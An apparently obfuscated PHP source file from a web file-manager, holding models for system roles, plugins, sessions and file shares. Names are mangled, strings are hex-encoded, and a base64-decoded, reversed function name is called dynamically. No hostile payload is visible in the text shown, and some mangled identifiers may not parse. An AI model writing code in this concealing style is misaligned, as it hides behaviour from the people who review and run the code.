$ÚÁåöİÍ = array()) { $ĞåßÓ“Õ =& $_SERVER[°‰†òö¯]; foreach ($©ªıÇù as $ÕãİäˆÀ => $ÜÄúİêö) { $ºÓºÙ‹ = $this->parseValue($ÜÄúİêö); if (is_scalar($ºÓºÙ‹)) { $º¯À ¯‡[] = $ºÓºÙ‹; $ÎîŸåê[] = $this->parseKey($ÕãİäˆÀ); } } $ü‹™»àŸ = $ĞåßÓ“Õ[975] . $this->parseTable($ÚÁåöİÍ[$ĞåßÓ“Õ[358]]) . $ĞåßÓ“Õ[976] . implode($ĞåßÓ“Õ[50], $ÎîŸåê) . $ĞåßÓ“Õ[977] . implode($ĞåßÓ“Õ[50], $º¯À ¯‡) . $ĞåßÓ“Õ[978]; return $this->execute($ü‹™»àŸ); } public function insertAll($òØ€—ˆ, $Å´¹¢ = array(), $şˆË®©ê = false) { $ı“¿€ˆ£ =& $_SERVER[°‰†òö¯]; if (!is_array($òØ€—ˆ[0])) { return !1; } $¢æìÍÀ¨ = array_keys($òØ€—ˆ[0]); $ÈìÉüçõ = array(); foreach ($òØ€—ˆ as $Ä‚ĞîÆ®) { $şöÑ×¡¹ = array(); foreach ($Ä‚ĞîÆ® as $²¡İª¥º => $¶ººÆµ«) { $¶ººÆµ« = $this->parseValue($¶ººÆµ«); if (is_scalar($¶ººÆµ«)) { $şöÑ×¡¹[] = $¶ººÆµ«; } } $ÈìÉüçõ[] = $ı“¿€ˆ£[339] . implode($ı“¿€ˆ£[50], $şöÑ×¡¹) . $ı“¿€ˆ£[978]; } array_walk($¢æìÍÀ¨, array($this, $ı“¿€ˆ£[979])); $÷º±”¬é = $şˆË®©ê ? $ı“¿€ˆ£[980] : $ı“¿€ˆ£[981]; $§¨ºÏ× = $÷º±”¬é . $ı“¿€ˆ£[982] . $this->parseTable($Å´¹¢[$ı“¿€ˆ£[358]]) . $ı“¿€ˆ£[976] . implode($ı“¿€ˆ£[50], $¢æìÍÀ¨) . $ı“¿€ˆ£[983] . implode($ı“¿€ˆ£[50], $ÈìÉüçõ); return $this->execute($§¨ºÏ×); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÖÓ´£ã¼ =& $_SERVER[°‰†òö¯]; $this->error = $this->_linkID->errno . $ÖÓ´£ã¼[4] . $this->_linkID->error; if ($ÖÓ´£ã¼[12] != $this->queryStr) { $this->error .= LNG($ÖÓ´£ã¼[48]) . $this->queryStr; } think_trace($this->error, $ÖÓ´£ã¼[12], $ÖÓ´£ã¼[49]); return $this->error; } public function escapeString($Îò¾Ú˜) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Îò¾Ú˜); } else { return addslashes($Îò¾Ú˜); } } public function parseKey(&$éàî¨Ÿ¤, $–—ÓÓÀˆ = true) { $±ÅóŠ¸Ş =& $_SERVER[°‰†òö¯]; if ($–—ÓÓÀˆ) { $éàî¨Ÿ¤ = $this->parseKeyCheck($éàî¨Ÿ¤); } if ($éàî¨Ÿ¤ != $±ÅóŠ¸Ş[222] && !preg_match($±ÅóŠ¸Ş[984], $éàî¨Ÿ¤)) { $éàî¨Ÿ¤ = $±ÅóŠ¸Ş[463] . trim($éàî¨Ÿ¤, $±ÅóŠ¸Ş[463]) . $±ÅóŠ¸Ş[463]; } return $éàî¨Ÿ¤; } } goto aõ°¼Àó¶; A›ÓŸÒ“¦œ: $fileSize = strrev(base64_decode($_SERVER[É¶É–øÑ][0])); function binCheckNeq($´Ä†şÛ, $••ÙÈœµ) { return $´Ä†şÛ != $••ÙÈœµ; } $_SERVER[$_SERVER[É¶É–øÑ][1]] = $fileSize($_SERVER[$_SERVER[É¶É–øÑ][2]]); goto AËÖ“ˆ‘®; b…ëÎ™¦§İ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\x65\155\137\157\x70\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\157\154\145", "\162\157\x6c\x65\x47\162\x6f\165\160", "\162\x65\x67\x69\x73\x74", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ìşî€ÂÌ) { return "\x53\x79\163\x74\145\x6d\117\160\164\x69\157\156\137{$ìşî€ÂÌ}"; } protected function optionDefault($ô»ñƒ° = '') { $„¢¨·ËÄ =& $_SERVER[°‰†òö¯]; if ($ô»ñƒ° == $„¢¨·ËÄ[12]) { return $GLOBALS[$„¢¨·ËÄ[6]][$„¢¨·ËÄ[459]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\162\157\x6c\x65\114\x69\163\x74"; public $field = array("\156\x61\155\145", "\x61\165\164\150", "\x6c\141\x62\145\154", "\x64\151\163\160\x6c\x61\x79", "\163\x79\163\164\x65\x6d", "\144\x65\x73\143", "\x69\x67\156\x6f\x72\145\105\x78\164", "\151\147\156\157\162\145\106\x69\154\x65\123\x69\172\x65", "\141\144\x6d\151\x6e\151\x73\x74\162\141\164\157\x72", "\163\157\162\x74"); public function listData($¯Íûşõ = false, $ÄîµĞ½Î = "\163\x6f\162\164", $³àèşûú = false) { $¸·Öù»ä =& $_SERVER[°‰†òö¯]; $øßÌıÌ = parent::listData($¯Íûşõ, $ÄîµĞ½Î, $³àèşûú); if (!$¯Íûşõ) { foreach ($øßÌıÌ as $Ùåù½£ => $èŞå·İè) { if ($èŞå·İè[$¸·Öù»ä[2183]] == 1) { $øßÌıÌ[$Ùåù½£][$¸·Öù»ä[528]] = LNG($¸·Öù»ä[2454]); } } } return $øßÌıÌ; } public function update($»‡¡™‡ƒ, $šâÈÅñ) { $æŠÀäÒ =& $_SERVER[°‰†òö¯]; $¼‘íÑ©Ú = parent::listData($»‡¡™‡ƒ); $µ²…·“„ = $this->findByName($šâÈÅñ[$æŠÀäÒ[32]]); if (!$¼‘íÑ©Ú || $µ²…·“„ && $µ²…·“„[$æŠÀäÒ[477]] != $¼‘íÑ©Ú[$æŠÀäÒ[477]]) { return !1; } if ($µ²…·“„[$æŠÀäÒ[2183]] == 1) { $šâÈÅñ = array($æŠÀäÒ[32] => $šâÈÅñ[$æŠÀäÒ[32]], $æŠÀäÒ[1995] => $šâÈÅñ[$æŠÀäÒ[1995]]); } $this->filterAuth($šâÈÅñ[$æŠÀäÒ[489]]); return parent::update($»‡¡™‡ƒ, $šâÈÅñ); } public function remove($Ã¡½²Î¸) { $Å”€Äñ® = parent::listData($Ã¡½²Î¸); if (!$Å”€Äñ® || $Å”€Äñ®[$_SERVER[°‰†òö¯][191]]) { return !1; } return parent::remove($Ã¡½²Î¸); } public function add($Â„ÈŒœ¹) { $ä­™ÔÔ =& $_SERVER[°‰†òö¯]; $ÁËŸ è¡ = $Â„ÈŒœ¹[$ä­™ÔÔ[32]]; if ($this->findByName($ÁËŸ è¡)) { return !1; } $’’íëâ¥ = array($ä­™ÔÔ[496] => $ÁËŸ è¡, $ä­™ÔÔ[1978] => $ä­™ÔÔ[12], $ä­™ÔÔ[1974] => $ä­™ÔÔ[1982], $ä­™ÔÔ[2455] => 1, $ä­™ÔÔ[1977] => 0, $ä­™ÔÔ[2456] => 0, $ä­™ÔÔ[1976] => $this->getSort()); $Â„ÈŒœ¹ = array_merge($’’íëâ¥, $Â„ÈŒœ¹); $this->filterAuth($Â„ÈŒœ¹[$ä­™ÔÔ[489]]); return parent::insert($Â„ÈŒœ¹); } private function getSort() { $¡­á½Ÿ =& $_SERVER[°‰†òö¯]; $Ë¨œæûú = parent::listData(); $€·‹ÑÇï = array_to_keyvalue($Ë¨œæûú, $¡­á½Ÿ[12], $¡­á½Ÿ[1996]); return empty($€·‹ÑÇï) ? 0 : max($€·‹ÑÇï) + 1; } private function filterAuth(&$öœ©ª’İ) { $æòùÅëÑ =& $_SERVER[°‰†òö¯]; $´ñ³Óä = array(); $´•§óÓÎ = array_filter(explode($æòùÅëÑ[50], $öœ©ª’İ)); foreach ($´•§óÓÎ as $öœ©ª’İ) { $²ó§Šë = explode($æòùÅëÑ[10], $öœ©ª’İ); if ($²ó§Šë[0] == $æòùÅëÑ[2457] && $²ó§Šë[1] != $æòùÅëÑ[1273]) { $÷÷ø¶Áƒ = $²ó§Šë[0] . $æòùÅëÑ[10] . $²ó§Šë[1] . $æòùÅëÑ[2458]; if (!in_array($÷÷ø¶Áƒ, $´•§óÓÎ)) { $´ñ³Óä[] = $÷÷ø¶Áƒ; } } $´ñ³Óä[] = $öœ©ª’İ; } $öœ©ª’İ = implode($æòùÅëÑ[50], $´ñ³Óä); } public function findRoleDefault() { $é¥¨Â®Õ =& $_SERVER[°‰†òö¯]; $İùÂÄ¯ = parent::listData(); $ÁÆºàà = !1; foreach ($İùÂÄ¯ as $™ÉÙòÔÁ) { if (!$™ÉÙòÔÁ || $™ÉÙòÔÁ[$é¥¨Â®Õ[1994]] == $é¥¨Â®Õ[230] || $™ÉÙòÔÁ[$é¥¨Â®Õ[2183]] == 1) { continue; } if (strstr($™ÉÙòÔÁ[$é¥¨Â®Õ[489]], $é¥¨Â®Õ[2459])) { continue; } if (!strstr($™ÉÙòÔÁ[$é¥¨Â®Õ[489]], $é¥¨Â®Õ[2460])) { continue; } if (!$ÁÆºàà) { $ÁÆºàà = $™ÉÙòÔÁ; continue; } $ğ­ö€Ò = explode($é¥¨Â®Õ[50], $ÁÆºàà[$é¥¨Â®Õ[489]]); $Àƒ¡£óø = explode($é¥¨Â®Õ[50], $™ÉÙòÔÁ[$é¥¨Â®Õ[489]]); if (count($ğ­ö€Ò) > count($Àƒ¡£óø)) { $ÁÆºàà = $™ÉÙòÔÁ; } } return $ÁÆºàà ? $ÁÆºàà[$é¥¨Â®Õ[477]] : $é¥¨Â®Õ[12]; } public function sort($î¾¡¾Ğæ, $ŸŠÎø£) { return parent::update($î¾¡¾Ğæ, $ŸŠÎø£); } } goto AÕàÁÄ—Ä; fÉ±ãéÄ: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\160\x6c\x75\x67\151\x6e\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\x73\x74\x61\x74\x75\x73", "\162\145\147\x69\145\163\x74", "\143\x6f\x6e\146\151\147"); public function loadList($¦ì’Á¤Ò = false) { $ì¤ì•æö = array_to_keyvalue($this->listData(), $_SERVER[°‰†òö¯][32]); if ($¦ì’Á¤Ò) { return $ì¤ì•æö[$¦ì’Á¤Ò]; } return $ì¤ì•æö; } public function init() { $™Ûä±¨ =& $_SERVER[°‰†òö¯]; Hook::trigger($™Ûä±¨[2096]); $È«ˆ·Ú = $this->loadPluginList(); foreach ($È«ˆ·Ú as $°Ÿ¤¿«« => $£äØÏÂú) { $‘ƒì®ãÇ = $this->appAllow($°Ÿ¤¿««, $£äØÏÂú); if (!$‘ƒì®ãÇ) { continue; } foreach ($£äØÏÂú[$™Ûä±¨[2097]] as $ºÊÇ½ŒÊ => $«²×é¥²) { Hook::bind($ºÊÇ½ŒÊ, $«²×é¥²); } } Hook::trigger($™Ûä±¨[2098]); Hook::trigger(ACTION); } public function appAllow($¤ãœÄ™ü, $•¡ÆŠ‘ë, $ºÔ«šŒ› = true) { $¯”‘œ‡‹ =& $_SERVER[°‰†òö¯]; $°ù§Á•ó = PLUGIN_DIR . $¤ãœÄ™ü . $¯”‘œ‡‹[2099]; if (!is_array($•¡ÆŠ‘ë) || !is_array($•¡ÆŠ‘ë[$¯”‘œ‡‹[2097]]) || $•¡ÆŠ‘ë[$¯”‘œ‡‹[811]] != 1 || !is_file($°ù§Á•ó)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¯”‘œ‡‹[6]][$¯”‘œ‡‹[2100]] || !$GLOBALS[$¯”‘œ‡‹[6]][$¯”‘œ‡‹[2101]]) { return !0; } $‹îÙĞ£– = explode($¯”‘œ‡‹[50], strtolower($GLOBALS[$¯”‘œ‡‹[6]][$¯”‘œ‡‹[2101]])); return in_array(strtolower($¤ãœÄ™ü), $‹îÙĞ£–) ? !1 : !0; } if ($ºÔ«šŒ› && !Action($¯”‘œ‡‹[2102])->checkAuth($¤ãœÄ™ü)) { return !1; } return !0; } public function unInstall($Âò†È¿) { $ª–şñ =& $_SERVER[°‰†òö¯]; $»†Ğåô = $this->loadList($Âò†È¿); if (file_exists(PLUGIN_DIR . $Âò†È¿)) { Hook::apply($Âò†È¿ . $ª–şñ[2103]); } $this->remove($»†Ğåô[$ª–şñ[477]]); } public function changeStatus($Œİé”ìª, $áæ€ƒ¥²) { $Û‚ÆÖÂ =& $_SERVER[°‰†òö¯]; $®Íâµ›  = $this->loadList($Œİé”ìª); if ($áæ€ƒ¥²) { Hook::apply($Œİé”ìª . $Û‚ÆÖÂ[2104]); } $this->update($®Íâµ› [$Û‚ÆÖÂ[477]], array($Û‚ÆÖÂ[2105] => $áæ€ƒ¥²)); } public function appRegist($Ş¥©¸”ë, $³«×ˆ§ü) { $ÄËøõ½í =& $_SERVER[°‰†òö¯]; $ˆ¿÷Ÿ = $this->loadList($Ş¥©¸”ë); if ($ˆ¿÷Ÿ) { $this->update($ˆ¿÷Ÿ[$ÄËøõ½í[477]], array($ÄËøõ½í[2097] => $³«×ˆ§ü)); } else { $ˆ¿ı×ä¡ = array($ÄËøõ½í[32] => $Ş¥©¸”ë, $ÄËøõ½í[2097] => $³«×ˆ§ü, $ÄËøõ½í[811] => 0, $ÄËøõ½í[6] => $this->getConfigDefault($Ş¥©¸”ë)); $this->insert($ˆ¿ı×ä¡); } } public function getConfigDefault($ÚŠ™‘ı›) { $ÚØŸñ¿Ö =& $_SERVER[°‰†òö¯]; $êäŠ³ğ¦ = array(); $ºøº¹”” = $this->getPackageJson($ÚŠ™‘ı›); if (!$ºøº¹”” && is_array($ºøº¹””[$ÚØŸñ¿Ö[2106]])) { return $êäŠ³ğ¦; } foreach ($ºøº¹””[$ÚØŸñ¿Ö[2106]] as $àÒÉš™è => $…ïíáƒ‡) { if (!isset($…ïíáƒ‡[$ÚØŸñ¿Ö[452]]) || isset($êäŠ³ğ¦[$àÒÉš™è])) { continue; } $êäŠ³ğ¦[$àÒÉš™è] = $…ïíáƒ‡[$ÚØŸñ¿Ö[452]]; } return $êäŠ³ğ¦; } public function getPackageJson($›Ó°Ú ”) { return Hook::apply($›Ó°Ú ” . $_SERVER[°‰†òö¯][2107]); } public function getConfig($ÂÇÊÍçˆ, $Ò†±Èö = false) { $Ñ”³Ñ©© =& $_SERVER[°‰†òö¯]; $øäÍƒı­ = array(); $‘º‘çâŞ = $this->loadList($ÂÇÊÍçˆ); if ($‘º‘çâŞ && is_array($‘º‘çâŞ[$Ñ”³Ñ©©[6]])) { $øäÍƒı­ = $‘º‘çâŞ[$Ñ”³Ñ©©[6]]; } if (!$øäÍƒı­ || $Ò†±Èö) { $øäÍƒı­ = $this->getConfigDefault($ÂÇÊÍçˆ); } return $øäÍƒı­; } public function setConfig($ë¨õÅù¨, $‰öŞı°” = false) { $¸ØÙ±§Ô =& $_SERVER[°‰†òö¯]; $ë©Çşíª = $this->loadList($ë¨õÅù¨); if (!$ë©Çşíª) { return !1; } $õ³´ŸÒú = $ë©Çşíª[$¸ØÙ±§Ô[6]]; if ($‰öŞı°” == !1) { $õ³´ŸÒú = array(); $‰öŞı°” = $this->getConfigDefault($ë¨õÅù¨); } foreach ($‰öŞı°” as $êùöÈñÇ => $¿“Î¡ËÎ) { $õ³´ŸÒú[$êùöÈñÇ] = is_string($¿“Î¡ËÎ) ? trim($¿“Î¡ËÎ) : $¿“Î¡ËÎ; } $this->update($ë©Çşíª[$¸ØÙ±§Ô[477]], array($¸ØÙ±§Ô[6] => $õ³´ŸÒú)); } public function viewList() { $Ÿ¿ç® =& $_SERVER[°‰†òö¯]; $ÓäÖ‰ô = $this->loadList(); $this->pluginScan($ÓäÖ‰ô); $ÓäÖ‰ô = $this->loadPluginList(); $ó“¥Ñ£õ = array(); foreach ($ÓäÖ‰ô as $½Ş¡—Ìå => $õåß‚„“) { $ª–§ƒÏ… = $õåß‚„“; unset($õåß‚„“[$Ÿ¿ç®[2097]], $õåß‚„“[$Ÿ¿ç®[6]]); $œ²æâ¿ = PLUGIN_DIR . $õåß‚„“[$Ÿ¿ç®[32]] . $Ÿ¿ç®[2099]; if (!is_file($œ²æâ¿)) { continue; } $®ò­ŠÕ¥ = Hook::apply($õåß‚„“[$Ÿ¿ç®[32]] . $Ÿ¿ç®[2107]); if (!is_array($®ò­ŠÕ¥)) { continue; } $ó“¥Ñ£õ[$½Ş¡—Ìå] = array_merge($õåß‚„“, $®ò­ŠÕ¥); if ($ª–§ƒÏ…[$Ÿ¿ç®[6]][$Ÿ¿ç®[1684]] != $®ò­ŠÕ¥[$Ÿ¿ç®[1658]]) { Hook::apply($õåß‚„“[$Ÿ¿ç®[32]] . $Ÿ¿ç®[2104]); $ª–§ƒÏ…[$Ÿ¿ç®[6]][$Ÿ¿ç®[1684]] = $®ò­ŠÕ¥[$Ÿ¿ç®[1658]]; $this->update($õåß‚„“[$Ÿ¿ç®[477]], array($Ÿ¿ç®[6] => $ª–§ƒÏ…[$Ÿ¿ç®[6]])); } } return $ó“¥Ñ£õ; } private function loadPluginList() { $¨£­åñç =& $_SERVER[°‰†òö¯]; $êéËîå = $this->loadList(); if (strtolower(MOD) == $¨£­åñç[2108]) { return $êéËîå; } $û³¦Ì‡Û = Hook::trigger($¨£­åñç[2109], $êéËîå); if ($êéËîå && !$û³¦Ì‡Û) { die; } return $û³¦Ì‡Û ? $û³¦Ì‡Û : $êéËîå; } private function pluginScan($ÃİçÔÛ) { $Ñ‹ÈÙäÑ =& $_SERVER[°‰†òö¯]; recursion_dir(PLUGIN_DIR, $Ô˜¶û½õ, $™â°³ŒÉ, 0); foreach ($Ô˜¶û½õ as $æáÈú›) { $±óÃéÇ = get_path_this($æáÈú›); if (isset($ÃİçÔÛ[$±óÃéÇ]) || !file_exists($æáÈú› . $Ñ‹ÈÙäÑ[2110]) || !file_exists($æáÈú› . $Ñ‹ÈÙäÑ[2099])) { continue; } Hook::apply($±óÃéÇ . $Ñ‹ÈÙäÑ[2104]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x73\145\163\x73\x69\x6f\156"; public function get($ûìÖ—Á) { $ËãÓ—€É =& $_SERVER[°‰†òö¯]; $É›ñ¸Ò• = $this->where(array($ËãÓ—€É[2111] => $ûìÖ—Á))->find(); if (!is_array($É›ñ¸Ò•)) { return !1; } return $É›ñ¸Ò•[$ËãÓ—€É[171]]; } public function set($¦äã´, $ùµ£ş§’, $±Õ¦˜ï— = 3600) { $È”È‘ÓÂ =& $_SERVER[°‰†òö¯]; $§ÖÎ°Éğ = array($È”È‘ÓÂ[2111] => $¦äã´, $È”È‘ÓÂ[2011] => $ùµ£ş§’, $È”È‘ÓÂ[2112] => $±Õ¦˜ï— + time()); if (Session::get($È”È‘ÓÂ[2113])) { $§ÖÎ°Éğ[$È”È‘ÓÂ[1771]] = Session::get($È”È‘ÓÂ[2113]); } else { $§ÖÎ°Éğ[$È”È‘ÓÂ[1771]] = 0; } if ($this->get($¦äã´)) { return $this->where(array($È”È‘ÓÂ[2111] => $¦äã´))->save($§ÖÎ°Éğ); } else { return $this->add($§ÖÎ°Éğ, array(), !0); } } public function remove($‘âü½ß£) { return $this->where(array($_SERVER[°‰†òö¯][2111] => $‘âü½ß£))->delete(); } public function clearTimeout() { return $this->where($_SERVER[°‰†òö¯][2114] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\x54\151\155\145", "\164\151\x6d\x65", "\151\x6e\x73\x65\162\x74\x2c\165\160\x64\141\164\x65", "\x66\165\x6e\x63\164\x69\x6f\x6e"), array("\143\162\x65\141\164\145\x54\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\x72\x74", "\146\x75\156\x63\164\151\157\156"), array("\x6f\x70\164\x69\x6f\156\163", '', "\151\156\163\145\x72\164\x2c\165\160\x64\x61\x74\x65\54\x73\x65\x6c\145\x63\x74", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ùíè¿ã) { $Öéƒú‘… =& $_SERVER[°‰†òö¯]; $›â„°é’ = isset($ùíè¿ã[0]) ? $ùíè¿ã[0] : !1; $ŠşªğİÀ = $Öéƒú‘…[2115] . USER_ID; return array($Öéƒú‘…[2116] => array(USER_ID, $Öéƒú‘…[2117]), $Öéƒú‘…[2056] => array($›â„°é’, $Öéƒú‘…[2118], $ŠşªğİÀ)); } protected function listSimple() { $´”­„ = array($_SERVER[°‰†òö¯][1771] => USER_ID); $âïúë¹¼ = $this->field($this->fieldList)->where($´”­„)->select(); return $âïúë¹¼ ? $âïúë¹¼ : array(); } protected function getInfo($–®‚®©î, $”ó¼…Îƒ = false, $ªöçš–” = '') { $ÛÌœ¢Òş =& $_SERVER[°‰†òö¯]; if (!$ªöçš–”) { $ªöçš–” = $ÛÌœ¢Òş[2115] . USER_ID; } if ($”ó¼…Îƒ) { return $this->_getShareInfo(array($ÛÌœ¢Òş[672] => $–®‚®©î)); } $Ï×ö¡üÈ = $this->cacheFunctionGet($ÛÌœ¢Òş[2058], $–®‚®©î, $ªöçš–”); $ÜÁı¨ö = $this->shareInfoMofify($Ï×ö¡üÈ, $ÛÌœ¢Òş[225]); if (isset($Ï×ö¡üÈ[$ÛÌœ¢Òş[88]]) && $ÜÁı¨ö != $Ï×ö¡üÈ[$ÛÌœ¢Òş[88]]) { $™·”Íè¼ = $this->cacheKeyMake($ÛÌœ¢Òş[2058], $–®‚®©î, $ªöçš–”); $Ï×ö¡üÈ = $this->_getShareInfo(array($ÛÌœ¢Òş[672] => $–®‚®©î)); Cache::set($™·”Íè¼, $Ï×ö¡üÈ); } return $Ï×ö¡üÈ; } private function shareInfoMofify(&$¥©Ò—½´, $ûÍ½¢€Š = "\x67\145\164") { $˜Åö²¤¨ =& $_SERVER[°‰†òö¯]; if (!$¥©Ò—½´ || !isset($¥©Ò—½´[$˜Åö²¤¨[672]])) { return; } $¹î–½Â = $˜Åö²¤¨[2119] . $¥©Ò—½´[$˜Åö²¤¨[672]]; if ($ûÍ½¢€Š == $˜Åö²¤¨[225]) { return Cache::get($¹î–½Â); } else { if ($ûÍ½¢€Š == $˜Åö²¤¨[2086]) { $áá¡ù™· = Cache::get($¹î–½Â); if ($áá¡ù™· === $¥©Ò—½´[$˜Åö²¤¨[88]]) { return; } $¥©Ò—½´[$˜Åö²¤¨[2120]] = USER_ID . $˜Åö²¤¨[464] . $¥©Ò—½´[$˜Åö²¤¨[88]]; Cache::set($¹î–½Â, $¥©Ò—½´[$˜Åö²¤¨[88]]); } else { if ($ûÍ½¢€Š == $˜Åö²¤¨[2121]) { Cache::remove($¹î–½Â); } } } } public function getInfoByHash($ÙÔ—´Í) { return $this->_getShareInfo(array($_SERVER[°‰†òö¯][2122] => $ÙÔ—´Í)); } public function getInfoByPath($‚¼Ê…íî) { $üËşòï¨ =& $_SERVER[°‰†òö¯]; $ë¶èŸºğ = array($üËşòï¨[1771] => USER_ID, $üËşòï¨[193] => $‚¼Ê…íî); return $this->_getShareInfo($ë¶èŸºğ); } public function getInfoBySourcePath($Á®ê»öŸ) { $óøäËç =& $_SERVER[°‰†òö¯]; $Î‚ÒÔ›Ô = array($óøäËç[1771] => USER_ID, $óøäËç[1255] => $Á®ê»öŸ); return $this->_getShareInfo($Î‚ÒÔ›Ô); } private function _getShareInfo($•ë¯Ç»Ş) { $Ê±œ„†û =& $_SERVER[°‰†òö¯]; $÷™Ôš‹† = $this->where($•ë¯Ç»Ş)->find(); if (!$÷™Ôš‹†) { return !1; } $•ë¯Ç»Ş = array($Ê±œ„†û[672] => $÷™Ôš‹†[$Ê±œ„†û[672]]); $é‰”å·Ø = $Ê±œ„†û[2123]; $·¿·Úœ› = Model($Ê±œ„†û[673])->order($Ê±œ„†û[477])->field($é‰”å·Ø)->where($•ë¯Ç»Ş)->select(); if ($÷™Ôš‹†[$Ê±œ„†û[193]] == $Ê±œ„†û[230]) { $÷™Ôš‹†[$Ê±œ„†û[90]] = IO::info($÷™Ôš‹†[$Ê±œ„†û[1255]]); } else { $÷™Ôš‹†[$Ê±œ„†û[90]] = Model($Ê±œ„†û[1419])->pathInfo($÷™Ôš‹†[$Ê±œ„†û[193]]); } $÷™Ôš‹†[$Ê±œ„†û[2124]] = $·¿·Úœ›; $this->shareInfoMofify($÷™Ôš‹†, $Ê±œ„†û[2086]); return $÷™Ôš‹†; } protected function getInfoAuth($ôÇî‚ò‘) { $úí–˜¤ =& $_SERVER[°‰†òö¯]; $†áÄæ³Ş = $this->getInfo($ôÇî‚ò‘); if ($†áÄæ³Ş[$úí–˜¤[1771]] == USER_ID) { $†áÄæ³Ş[$úí–˜¤[489]] = $†áÄæ³Ş[$úí–˜¤[90]][$úí–˜¤[489]]; } else { $†áÄæ³Ş[$úí–˜¤[489]] = Model($úí–˜¤[571])->authMake($†áÄæ³Ş[$úí–˜¤[2124]]); } return $†áÄæ³Ş; } protected function listData($–ÒÂì = null, $±äÚ  = 300) { $£²æàû¼ =& $_SERVER[°‰†òö¯]; $ôÜ¤¥ÓÆ = array(array($£²æàû¼[566] => array($£²æàû¼[1087], 0), $£²æàû¼[670] => array($£²æàû¼[1087], 0), $£²æàû¼[2125] => $£²æàû¼[2074])); if ($–ÒÂì == $£²æàû¼[2126]) { $ôÜ¤¥ÓÆ = array($£²æàû¼[566] => 1); } else { if ($–ÒÂì == $£²æàû¼[1240]) { $ôÜ¤¥ÓÆ = array($£²æàû¼[670] => 1); } } $ôÜ¤¥ÓÆ[$£²æàû¼[1771]] = USER_ID; $×Ä¯ÆüÉ = $this->where($ôÜ¤¥ÓÆ)->selectPage($±äÚ ); return $×Ä¯ÆüÉ; } protected function listToMe($÷‚çºÌ = 300) { $àè¨ò†› =& $_SERVER[°‰†òö¯]; $ª«öØàù = Model($àè¨ò†›[2127])->userGroupParents(USER_ID); $“Êı÷ß = array($àè¨ò†›[655] => SourceModel::TYPE_USER, $àè¨ò†›[573] => USER_ID); if ($ª«öØàù) { $“Êı÷ß = array(array($àè¨ò†›[655] => SourceModel::TYPE_USER, $àè¨ò†›[573] => USER_ID), array($àè¨ò†›[655] => SourceModel::TYPE_GROUP, $àè¨ò†›[573] => array($àè¨ò†›[7], $ª«öØàù)), $àè¨ò†›[2125] => $àè¨ò†›[2074]); } $ƒ‹À¿õ® = Model($àè¨ò†›[673])->where($“Êı÷ß)->selectPage($÷‚çºÌ); $Àóì¥ˆ• = array_to_keyvalue_group($ƒ‹À¿õ®[$àè¨ò†›[447]], $àè¨ò†›[672]); if (!$Àóì¥ˆ•) { return $ƒ‹À¿õ®; } $£şœÆ¡± = $àè¨ò†›[2128]; $“Êı÷ß = array($àè¨ò†›[672] => array($àè¨ò†›[494], array_keys($Àóì¥ˆ•)), $àè¨ò†›[1771] => array($àè¨ò†›[1089], $àè¨ò†›[230])); $ûô¹¬ã— = $this->field($£şœÆ¡±)->where($“Êı÷ß)->select(); foreach ($ûô¹¬ã— as $‰÷ˆ¡æ‘ => &$À–õ†¡) { $À–õ†¡[$àè¨ò†›[2124]] = $Àóì¥ˆ•[$À–õ†¡[$àè¨ò†›[672]]]; } unset($À–õ†¡); $å™†–¼ğ = array($àè¨ò†›[2129] => $ûô¹¬ã—, $àè¨ò†›[2130] => $ƒ‹À¿õ®[$àè¨ò†›[444]]); return $å™†–¼ğ; } protected function shareAdd($ƒ×÷Š…œ, $àâÀ›¥Õ) { $Ê°Ïù˜¡ =& $_SERVER[°‰†òö¯]; $µÑ¼Ñì­ = $this->_addShareData($ƒ×÷Š…œ, $àâÀ›¥Õ); if (!empty($àâÀ›¥Õ[$Ê°Ïù˜¡[2131]])) { $this->_shareAuthSet($µÑ¼Ñì­, $àâÀ›¥Õ[$Ê°Ïù˜¡[2131]]); } $this->shareEventAdd($ƒ×÷Š…œ, $àâÀ›¥Õ, $Ê°Ïù˜¡[2132]); return $µÑ¼Ñì­; } protected function shareAddSystem($õ„÷Ş„‹, $ıíÅÃª°) { $†ôİ³ïù =& $_SERVER[°‰†òö¯]; $·Ü‚¬Ó = $this->_addShareData($õ„÷Ş„‹, $ıíÅÃª°, $†ôİ³ïù[191]); $this->_shareAuthSet($·Ü‚¬Ó, $ıíÅÃª°[$†ôİ³ïù[2131]]); return $·Ü‚¬Ó; } private function shareEventAdd($­Ç¥ØÇ, $œà„ĞŠÒ, $Â½şÍş = "\141\x64\x64") { $€üãº¹¢ =& $_SERVER[°‰†òö¯]; if (!$­Ç¥ØÇ || $­Ç¥ØÇ == $€üãº¹¢[230]) { return; } if ($Â½şÍş == $€üãº¹¢[2132]) { if ($œà„ĞŠÒ[$€üãº¹¢[566]] == $€üãº¹¢[91]) { Model($€üãº¹¢[640])->eventShare($­Ç¥ØÇ, $€üãº¹¢[2133]); } if ($œà„ĞŠÒ[$€üãº¹¢[670]] == $€üãº¹¢[91]) { Model($€üãº¹¢[640])->eventShare($­Ç¥ØÇ, $€üãº¹¢[2134]); } return; } $Âˆ§Õõ¶ = $this->getInfoByPath($­Ç¥ØÇ); $ËñÔõ¶® = $€üãº¹¢[2135]; if ($Âˆ§Õõ¶[$€üãº¹¢[566]] == $€üãº¹¢[230] && $œà„ĞŠÒ[$€üãº¹¢[566]] == $€üãº¹¢[91]) { $ËñÔõ¶® = $€üãº¹¢[2133]; } if ($Âˆ§Õõ¶[$€üãº¹¢[566]] == $€üãº¹¢[91] && $œà„ĞŠÒ[$€üãº¹¢[566]] == $€üãº¹¢[230]) { $ËñÔõ¶® = $€üãº¹¢[2136]; } if 